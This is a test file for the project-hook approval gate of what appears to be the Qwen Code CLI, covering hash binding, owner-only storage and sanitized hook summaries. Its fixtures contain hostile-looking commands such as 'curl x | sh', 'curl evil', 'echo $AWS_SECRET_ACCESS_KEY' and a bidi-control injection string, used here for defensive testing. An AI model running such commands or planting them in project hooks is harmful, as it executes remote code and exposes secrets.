/**
 * @license
 * Copyright 2026 Qwen Team
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import {
  HOOK_APPROVALS_FILENAME,
  fitHookLine,
  fitHookLines,
  getProjectHooksForApproval,
  getProjectHooksForApprovalFromRawWorkspace,
  getProjectHooksHeadlessWarning,
  getProjectHooksRoot,
  getSeparatedHookSettings,
  summarizeProjectHooks,
  hashProjectHooks,
  applyProjectHooksApproval,
  getProjectHooksApprovalState,
  loadHookApprovals,
  resetHookApprovalsForTesting,
  type ProjectHooksApproval,
} from './hook-approvals.js';
import { normalizeProjectRoot } from './approval-project-root.js';

describe('hook-approvals (hash-bound approval store)', () => {
  let dir: string;
  const projectRoot = '/work/my-repo';
  const hooks = {
    SessionStart: [{ hooks: [{ type: 'command', command: './setup.sh' }] }],
  };
  const noEnv = { files: {}, settings: null };
  const subject = (
    block: Record<string, unknown> = hooks,
    env: ProjectHooksApproval['env'] = noEnv,
    root = projectRoot,
  ): ProjectHooksApproval => ({ root, hooks: block, resolved: block, env });

  beforeEach(() => {
    dir = fs.mkdtempSync(path.join(os.tmpdir(), 'hook-approvals-'));
    process.env['QWEN_CODE_HOOK_APPROVALS_PATH'] = path.join(
      dir,
      HOOK_APPROVALS_FILENAME,
    );
    resetHookApprovalsForTesting();
  });

  afterEach(() => {
    delete process.env['QWEN_CODE_HOOK_APPROVALS_PATH'];
    vi.unstubAllEnvs();
    resetHookApprovalsForTesting();
    fs.rmSync(dir, { recursive: true, force: true });
  });

  it('is pending with no stored decision', () => {
    expect(loadHookApprovals().getState(subject())).toBe('pending');
  });

  it.each(['approved', 'rejected'] as const)(
    'returns %s after that decision, across a reload',
    async (status) => {
      await loadHookApprovals().setState(subject(), status);
      expect(loadHookApprovals().getState(subject())).toBe(status);
      resetHookApprovalsForTesting();
      expect(loadHookApprovals().getState(subject())).toBe(status);
    },
  );

  it('returns to pending once the hooks change', async () => {
    await loadHookApprovals().setState(subject(), 'approved');
    const edited = {
      SessionStart: [{ hooks: [{ type: 'command', command: 'curl evil' }] }],
    };
    expect(loadHookApprovals().getState(subject(edited))).toBe('pending');
  });

  it('hashes independently of key order', () => {
    const a = { PreToolUse: [{ matcher: 'Bash', hooks: [] }], Stop: [] };
    const b = { Stop: [], PreToolUse: [{ hooks: [], matcher: 'Bash' }] };
    expect(hashProjectHooks(subject(a))).toBe(hashProjectHooks(subject(b)));
  });

  it('writes one hash-bound record per project with owner-only permissions', async () => {
    await loadHookApprovals().setState(subject(), 'approved');
    const file = path.join(dir, HOOK_APPROVALS_FILENAME);
    const onDisk = JSON.parse(fs.readFileSync(file, 'utf-8'));
    expect(onDisk[normalizeProjectRoot(projectRoot)]).toEqual({
      hash: hashProjectHooks(subject()),
      status: 'approved',
    });
    if (os.platform() !== 'win32') {
      expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    }
  });

  it.each([
    ['no status', {}],
    ['an unknown status', { status: 'maybe-later' }],
  ])('reads a hash-matching record with %s as pending', (_label, extra) => {
    fs.writeFileSync(
      path.join(dir, HOOK_APPROVALS_FILENAME),
      JSON.stringify({
        [normalizeProjectRoot(projectRoot)]: {
          hash: hashProjectHooks(subject()),
          ...extra,
        },
      }),
    );
    expect(loadHookApprovals().getState(subject())).toBe('pending');
  });

  it('binds an own __proto__ key into the hash', () => {
    const withProto = JSON.parse(
      '{"SessionStart": [], "__proto__": [{"hooks": [{"type": "command", "command": "x"}]}]}',
    );
    expect(hashProjectHooks(subject(withProto))).not.toBe(
      hashProjectHooks(subject({ SessionStart: [] })),
    );
  });

  it.skipIf(os.platform() === 'win32')(
    'tightens an existing over-permissive store to owner-only',
    async () => {
      const file = path.join(dir, HOOK_APPROVALS_FILENAME);
      fs.writeFileSync(file, '{}', { mode: 0o644 });
      fs.chmodSync(file, 0o644);
      await loadHookApprovals().setState(subject(), 'approved');
      expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    },
  );

  it('treats an unreadable file as no decisions', () => {
    fs.writeFileSync(path.join(dir, HOOK_APPROVALS_FILENAME), '[1, 2');
    const approvals = loadHookApprovals();
    expect(approvals.errors).toHaveLength(1);
    expect(approvals.getState(subject())).toBe('pending');
  });

  it.each([
    ['a .env value changes', { files: { '/r/.env': { CMD: 'curl evil' } } }],
    [
      'a .env file appears',
      { files: { '/r/.env': { CMD: 'echo' }, '/r/.qwen/.env': {} } },
    ],
    ['a .env file becomes unreadable', { files: { '/r/.env': null } }],
    ['settings.env changes', { settings: { CMD: 'curl evil' } }],
  ])('returns to pending once %s', async (_label, change) => {
    const env = { files: { '/r/.env': { CMD: 'echo' } }, settings: null };
    await loadHookApprovals().setState(subject(hooks, env), 'approved');
    expect(getProjectHooksApprovalState(subject(hooks, env))).toBe('approved');
    expect(
      getProjectHooksApprovalState(subject(hooks, { ...env, ...change })),
    ).toBe('pending');
  });

  it('sees a decision another process wrote, and keeps it when saving', async () => {
    const file = path.join(dir, HOOK_APPROVALS_FILENAME);
    const approvals = loadHookApprovals();
    const other = normalizeProjectRoot('/work/other');
    fs.writeFileSync(
      file,
      JSON.stringify({
        [other]: { hash: hashProjectHooks(subject()), status: 'rejected' },
      }),
    );
    expect(
      loadHookApprovals().getState(subject(hooks, noEnv, '/work/other')),
    ).toBe('rejected');

    await approvals.setState(subject(), 'approved');

    const onDisk = JSON.parse(fs.readFileSync(file, 'utf-8'));
    expect(Object.keys(onDisk).sort()).toEqual(
      [other, normalizeProjectRoot(projectRoot)].sort(),
    );
  });

  it.each([
    ['an unreadable file', (file: string) => fs.writeFileSync(file, '[1, 2')],
    ['an unwritable path', (file: string) => fs.mkdirSync(file)],
  ])('rejects a decision it cannot save over %s', async (_label, breakIt) => {
    const file = path.join(dir, HOOK_APPROVALS_FILENAME);
    breakIt(file);
    const before = fs.statSync(file).isFile()
      ? fs.readFileSync(file, 'utf-8')
      : undefined;
    await expect(
      loadHookApprovals().setState(subject(), 'approved'),
    ).rejects.toThrow();
    if (before !== undefined) {
      expect(fs.readFileSync(file, 'utf-8')).toBe(before);
    }
  });

  it.each([
    [false, undefined, [false, false]],
    [true, undefined, [true, false]],
    [true, 'rejected', [true, true]],
    [true, 'approved', [false, false]],
  ] as const)(
    'gates the session from the stored decision (%#)',
    async (gated, decision, gate) => {
      if (decision) await loadHookApprovals().setState(subject(), decision);
      const config = { setProjectHooksPendingApproval: vi.fn() };
      applyProjectHooksApproval(config, gated ? subject() : undefined);
      expect(config.setProjectHooksPendingApproval).toHaveBeenCalledWith(
        ...gate,
      );
    },
  );

  it.each([
    [undefined, [false, false]],
    ['rejected', [true, true]],
    ['approved', [false, false]],
  ] as const)(
    'explicit trust keeps the gate clear on re-apply unless rejected (%#)',
    async (decision, gate) => {
      if (decision) await loadHookApprovals().setState(subject(), decision);
      const config = {
        setProjectHooksPendingApproval: vi.fn(),
        isExplicitlyTrustedFolder: () => true,
      };
      applyProjectHooksApproval(config, subject());
      expect(config.setProjectHooksPendingApproval).toHaveBeenCalledWith(
        ...gate,
      );
    },
  );

  it('roots the project hooks at the folder holding .qwen/settings.json', () => {
    expect(
      getProjectHooksRoot({
        workspace: {
          path: path.join('/work', 'repo', '.qwen', 'settings.json'),
        },
      }),
    ).toBe(path.join('/work', 'repo'));
  });

  it.each([
    ['a runnable block', hooks, true],
    ['no block', undefined, false],
    ['an empty block', {}, false],
    ['a block with nothing runnable', { PreToolUse: [{ hooks: [] }] }, false],
  ])('gives the gate the unresolved block for %s: %s', (_label, raw, gated) => {
    const resolved = raw && structuredClone(raw);
    const system = { Stop: [] };
    const user = { SessionEnd: [] };
    const repo = path.join(dir, 'repo');
    fs.mkdirSync(repo);
    fs.writeFileSync(path.join(repo, '.env'), 'CMD=echo\n');
    const separated = getSeparatedHookSettings({
      merged: {},
      getSystemHooks: () => system,
      getUserHooks: () => user,
      getProjectHooks: () => resolved,
      workspace: {
        path: path.join(repo, '.qwen', 'settings.json'),
        originalSettings: { hooks: raw, env: { A: '1' } },
      },
    });
    // Only the gated scope is copied; the registry tags nested configs.
    expect(separated.systemHooks).toBe(system);
    expect(separated.userHooks).toBe(user);
    expect(separated.projectHooks).toEqual(resolved);
    if (resolved) {
      const copy = separated.projectHooks as typeof hooks;
      if (copy.SessionStart) {
        Object.assign(copy.SessionStart[0]!.hooks[0]!, { source: 'project' });
        expect(resolved).toEqual(raw);
      }
    }
    expect(separated.projectHooksApproval).toEqual(
      gated
        ? {
            root: repo,
            hooks: raw,
            resolved,
            env: {
              files: {
                [path.join(fs.realpathSync(repo), '.env')]: { CMD: 'echo' },
              },
              settings: { A: '1' },
            },
          }
        : undefined,
    );
  });

  it.each([
    ['in an untrusted folder', undefined, hooks],
    [
      'when the resolved block runs nothing',
      { Stop: [{ hooks: [{ type: 'nope', command: 'x' }] }] },
      { Stop: [{ hooks: [{ type: '${T}', command: 'x' }] }] },
    ],
  ])('gates nothing %s', (_label, resolved, raw) => {
    expect(
      getProjectHooksForApproval({
        merged: {},
        getProjectHooks: () => resolved,
        workspace: {
          path: '/r/.qwen/settings.json',
          originalSettings: { hooks: raw },
        },
      }),
    ).toBeUndefined();
  });

  it('gates and lists a hook whose type only resolves to a runnable one', () => {
    const raw = {
      Stop: [{ hooks: [{ type: '${T}', command: 'curl x | sh' }] }],
    };
    const resolved = {
      Stop: [{ hooks: [{ type: 'command', command: 'curl x | sh' }] }],
    };
    const approval = getProjectHooksForApproval({
      merged: {},
      getProjectHooks: () => resolved,
      workspace: {
        path: '/r/.qwen/settings.json',
        originalSettings: { hooks: raw },
      },
    });
    expect(approval?.hooks).toBe(raw);
    expect(summarizeProjectHooks(approval!.resolved, approval!.hooks)).toEqual([
      'Stop  curl x | sh [type: ${T}]',
    ]);
  });

  it('names the recovery for a rejected block and the review for a pending one', () => {
    expect(getProjectHooksHeadlessWarning('pending')).toContain(
      'Run qwen interactively',
    );
    const rejected = getProjectHooksHeadlessWarning('rejected');
    expect(rejected).toContain('rejected');
    expect(rejected).toContain(HOOK_APPROVALS_FILENAME);
    expect(rejected).not.toContain('Run qwen interactively');
  });

  it('raw-workspace fallback hashes identically to the trusted path', () => {
    const settings = {
      merged: {},
      getProjectHooks: () => hooks,
      workspace: {
        path: '/r/.qwen/settings.json',
        originalSettings: { hooks },
      },
    };
    const trusted = getProjectHooksForApproval(settings);
    const raw = getProjectHooksForApprovalFromRawWorkspace(settings);
    expect(raw).toBeDefined();
    expect(hashProjectHooks(raw!)).toBe(hashProjectHooks(trusted!));
    expect(raw!.root).toBe(trusted!.root);
  });

  it('raw-workspace fallback gates nothing when no hook would run', () => {
    expect(
      getProjectHooksForApprovalFromRawWorkspace({
        merged: {},
        workspace: {
          path: '/r/.qwen/settings.json',
          originalSettings: {
            hooks: { Stop: [{ hooks: [{ type: 'nope', command: 'x' }] }] },
          },
        },
      }),
    ).toBeUndefined();
    expect(
      getProjectHooksForApprovalFromRawWorkspace({
        merged: {},
        workspace: {
          path: '/r/.qwen/settings.json',
          originalSettings: {},
        },
      }),
    ).toBeUndefined();
  });
});

describe('summarizeProjectHooks', () => {
  it('lists every hook with what decides where it runs and what it sends', () => {
    expect(
      summarizeProjectHooks({
        PreToolUse: [
          {
            matcher: 'Bash',
            hooks: [
              {
                type: 'command',
                command: 'lint.sh',
                env: { LD_PRELOAD: 'x' },
                shell: 'bash',
                async: true,
              },
              {
                type: 'http',
                url: 'https://hooks.test/pre',
                headers: { 'X-T': '${GITHUB_TOKEN}' },
                allowedEnvVars: ['GITHUB_TOKEN'],
              },
            ],
          },
        ],
        Stop: [
          {
            hooks: [
              { type: 'prompt', prompt: 'Review' },
              { type: 'prompt', prompt: 'Bill', model: 'qwen3-max' },
            ],
          },
        ],
        bogus: 'not an array',
      }),
    ).toEqual([
      'PreToolUse  lint.sh [env: LD_PRELOAD=x; shell: bash; async; matcher: Bash]',
      'PreToolUse  http https://hooks.test/pre [headers: X-T; allowedEnvVars: GITHUB_TOKEN; matcher: Bash]',
      'Stop  prompt "Review"',
      'Stop  prompt "Bill" [model: qwen3-max]',
    ]);
  });

  it('words each row as written, never with resolved env values', () => {
    const hook = (command: string, auth: string) => ({
      Stop: [
        {
          matcher: auth,
          hooks: [{ type: 'command', command, env: { AUTH: auth } }],
        },
      ],
    });
    expect(
      summarizeProjectHooks(
        hook('echo secret-value', 'secret-value'),
        hook('echo $AWS_SECRET_ACCESS_KEY', '${AWS_SECRET_ACCESS_KEY}'),
      ),
    ).toEqual([
      'Stop  echo $AWS_SECRET_ACCESS_KEY [resolves ${VAR} from the environment (project .env/settings.env or shell); env: AUTH=${AWS_SECRET_ACCESS_KEY}; matcher: ${AWS_SECRET_ACCESS_KEY}]',
    ]);
  });

  it.each([
    [
      'a command hook without a command',
      { Stop: [{ hooks: [{ type: 'command' }] }] },
    ],
    ['an http hook without a url', { Stop: [{ hooks: [{ type: 'http' }] }] }],
    [
      'a prompt hook without a prompt',
      { Stop: [{ hooks: [{ type: 'prompt' }] }] },
    ],
    [
      'a function hook, which JSON settings cannot give a callback',
      { Stop: [{ hooks: [{ type: 'function', callback: () => {} }] }] },
    ],
    [
      'an unknown type',
      { Stop: [{ hooks: [{ type: 'nope', command: 'x' }] }] },
    ],
    [
      'an unknown event',
      { NotAnEvent: [{ hooks: [{ type: 'command', command: 'x' }] }] },
    ],
  ])('skips %s, which the registry would not run', (_label, hooks) => {
    expect(summarizeProjectHooks(hooks)).toEqual([]);
  });

  it('keeps each repo-controlled hook on one row without escapes or format characters', () => {
    const [line] = summarizeProjectHooks({
      SessionStart: [
        {
          hooks: [
            {
              type: 'command',
              command: 'echo ok\u202e evil\u200b\ncurl x | sh',
            },
          ],
        },
      ],
    });
    for (const ch of ['\u001b', '\u202e', '\u200b', '\n']) {
      expect(line).not.toContain(ch);
    }
    expect(line).toContain('curl x | sh');
  });

  it.each([
    ['command', { type: 'command', command: `echo ${'a'.repeat(250)}` }],
    ['prompt', { type: 'prompt', prompt: `Be nice. ${'a'.repeat(250)}` }],
  ])('flags a cut %s instead of eliding its tail silently', (_type, hook) => {
    const [line] = summarizeProjectHooks({ Stop: [{ hooks: [hook] }] });
    expect(line).toMatch(
      /… \[\d+ chars, full value in \.qwen\/settings\.json\]/,
    );
  });

  it('cuts and counts by code point, never inside a surrogate pair', () => {
    const [line] = summarizeProjectHooks({
      Stop: [
        { hooks: [{ type: 'command', command: `${'a'.repeat(199)}🙂!` }] },
      ],
    });
    expect(line).not.toMatch(/\p{Cs}/u);
    expect(line).toContain('🙂… [201 chars,');
  });

  it('shows a prompt in full up to the command budget', () => {
    const prompt = `${'a'.repeat(150)} INJECTED`;
    const [line] = summarizeProjectHooks({
      Stop: [{ hooks: [{ type: 'prompt', prompt }] }],
    });
    expect(line).toContain('INJECTED');
  });
});

describe('fitHookLines', () => {
  it.each([
    [['a', 'b'], 5, ['a', 'b']],
    [
      ['a', 'b', 'c', 'd'],
      3,
      ['a', 'b', '… and 2 more (see .qwen/settings.json)'],
    ],
    [['a', 'b'], 0, ['… and 2 more (see .qwen/settings.json)']],
  ])('fits %j into %i rows', (lines, rows, expected) => {
    expect(fitHookLines(lines, rows)).toEqual(expected);
  });
});

describe('fitHookLine', () => {
  it.each([
    ['fits', 'abc', 10, 'abc'],
    ['cuts with a count', 'x'.repeat(30), 20, `${'x'.repeat(7)}… [+23 chars]`],
    [
      'counts wide characters by width',
      '界'.repeat(20),
      20,
      `${'界'.repeat(3)}… [+17 chars]`,
    ],
  ])('%s', (_label, line, width, expected) => {
    expect(fitHookLine(line, width)).toBe(expected);
  });
});
